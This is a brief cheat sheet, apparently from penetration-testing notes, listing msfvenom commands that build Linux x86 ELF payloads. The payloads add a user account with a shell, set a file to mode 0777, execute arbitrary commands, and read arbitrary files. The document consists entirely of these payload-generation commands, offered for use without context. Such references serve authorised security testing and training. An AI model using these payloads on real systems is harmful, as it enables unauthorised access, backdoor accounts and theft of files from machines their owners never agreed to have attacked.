# Executable Binary Payloads

## Add User Linux Exec Payload

```
$ msfvenom -p linux/x86/adduser user=<username> pass=<password> shell=/bin/sh -f elf -o payload
```

## Execute Linux Exec Payload

```
$ msfvenom -p linux/x86/chmod file=/path/to/file mode=0777 -f elf -o payload-x86

$ msfvenom -p linux/x86/exec cmd="<commands>" -f elf -o payload-x86

$ msfvenom -p linux/x86/read_file fd=1 path=/path/to/file -f elf -o payload-x86
```